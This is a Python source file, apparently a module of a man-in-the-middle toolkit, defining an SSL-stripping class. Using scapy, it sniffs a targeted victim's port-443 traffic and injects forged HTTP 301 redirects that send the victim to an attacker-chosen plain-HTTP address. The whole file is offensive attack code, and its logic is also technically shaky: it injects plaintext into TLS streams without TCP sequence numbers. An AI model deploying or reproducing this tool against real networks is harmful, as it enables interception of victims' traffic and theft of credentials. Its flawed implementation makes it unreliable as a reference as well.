from scapy.all import *
from scapy.layers.inet import IP
from logger import log_info, log_warning
from scapy.layers.http import HTTPRequest, TCP, Raw

class SSLStripper:
    def __init__(self, interface, ip_victim, ip_to_spoof):
        self.interface = interface
        self.ip_victim = ip_victim
        self.ip_to_spoof = ip_to_spoof

    def strip(self):
        log_info("Starting SSL stripping")
        sniff(
            filter="tcp and port 443",
            prn=self._on_https_request,
            iface=self.interface,
            count=0,
        )
        log_warning("Stopping SSL stripping")

    def _on_https_request(self, packet):
        # TODO: move these checks into sniff filter (also for DNS)
        if (
            # Ideally we would want to check that this is an HTTPS packet, but it is encrypted
            packet[IP].src == self.ip_victim
        ):
            log_info(
                "Received HTTPS request for {} from {}".format(
                    packet[IP].dst, packet[IP].src
                )
            )
            # Construct the HTTP response
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA")
                / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(self.ip_to_spoof))
            )

            send(response, verbose=0)
            log_info("Sent HTTP response for {} to {}".format(packet[IP].src, self.ip_to_spoof))
        else:
            log_info("Ignoring packet from {}".format(packet[IP].src))